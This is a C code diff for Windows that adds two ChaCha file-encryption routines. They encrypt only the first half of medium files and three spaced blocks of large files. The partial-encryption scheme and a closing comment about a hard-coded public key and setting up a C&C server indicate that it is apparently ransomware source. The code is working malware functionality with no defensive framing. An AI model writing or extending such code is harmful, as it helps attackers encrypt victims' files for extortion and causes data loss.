@@ -60,6 +60,104 @@ int chachaFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BY
 	return 0;
 }
 
+int chachaMediumFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
+	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];
+	DWORD dwMaxLengthEncrypt = GetFileSize(hFileIn, NULL) / 2;
+	printf("Max encrypt %d\n", dwMaxLengthEncrypt);
+	CHACHA_CONTEXT context;
+	DWORD byteRead;
+	DWORD byteWrite;
+	chachaKeySetup(&context, key);
+	chachaNonceSetup(&context, nonce);
+
+	SetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
+	SetFilePointer(hFileOut, 0, 0, FILE_BEGIN);
+	DWORD totalRead = 0;
+	for (;;) {
+		if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
+			printf("Read file fails. 0x%x\n", GetLastError());
+			return -1;
+		}
+
+		chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
+		if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
+			printf("Write file fails. 0x%x\n", GetLastError());
+			return -1;
+		}
+
+		totalRead += byteRead;
+		if (totalRead > dwMaxLengthEncrypt) {
+			break;
+		}
+
+		if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
+			break;
+		}
+	}
+	printf("Encrypt suceeds\n");
+	return 0;
+}
+
+int chachaLargeFileEncrypt(HANDLE hFileIn, HANDLE hFileOut, const BYTE* key, const BYTE* nonce) {
+	static BYTE buffer[2][CHACHA_BLOCKLENGTH * 1024];
+	DWORD fileSize = GetFileSize(hFileIn, NULL);
+	DWORD dwEncryptBlockSize = ((1500.0 / 9240.0) * fileSize) / 3.0;
+	DWORD dwSkipLength = (fileSize - 3 * dwEncryptBlockSize) / 2;
+
+	printf("encryptBlockSize %d\n", dwEncryptBlockSize);
+	CHACHA_CONTEXT context;
+	DWORD byteRead;
+	DWORD byteWrite;
+	chachaKeySetup(&context, key);
+	chachaNonceSetup(&context, nonce);
+
+	SetFilePointer(hFileIn, 0, 0, FILE_BEGIN);
+	SetFilePointer(hFileOut, 0, 0, FILE_BEGIN);
+	DWORD totalRead = 0;
+
+	for (int i = 0; i < 3; i++) {
+		DWORD totalReadBlock = 0;
+		if (i == 2) {
+			for (;;) {
+				if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
+					printf("Read file fails. 0x%x\n", GetLastError());
+					return -1;
+				}
+
+				chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
+				if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
+					printf("Write file fails. 0x%x\n", GetLastError());
+					return -1;
+				}
+				if (byteRead < CHACHA_BLOCKLENGTH * 1024) {
+					break;
+				}
+			}
+		}
+		else {
+			while (TRUE) { // encrypt block
+				if (totalReadBlock + CHACHA_BLOCKLENGTH * 1024 > dwEncryptBlockSize) {
+					break;
+				}
+				if (ReadFile(hFileIn, buffer[0], CHACHA_BLOCKLENGTH * 1024, &byteRead, NULL) == FALSE) {
+					printf("Read file fails. 0x%x\n", GetLastError());
+					return -1;
+				}
+				chachaEncrypt(&context, buffer[0], buffer[1], byteRead);
+				if (WriteFile(hFileOut, buffer[1], byteRead, &byteWrite, NULL) == FALSE) {
+					printf("Write file fails. 0x%x\n", GetLastError());
+					return -1;
+				}
+				totalReadBlock += byteRead;
+			}
+			SetFilePointer(hFileIn, (totalReadBlock + CHACHA_BLOCKLENGTH * 1024 - dwEncryptBlockSize) + dwSkipLength, 0, FILE_CURRENT);
+			SetFilePointer(hFileOut, totalReadBlock + CHACHA_BLOCKLENGTH * 1024 - dwEncryptBlockSize + dwSkipLength, 0, FILE_CURRENT);
+		}
+	}
+	printf("Encrypt suceeds\n");
+	return 0;
+}
+
 
 //- Hard - coded public key
 //- Server public key(Github) -> have to set up CC, too lazy...
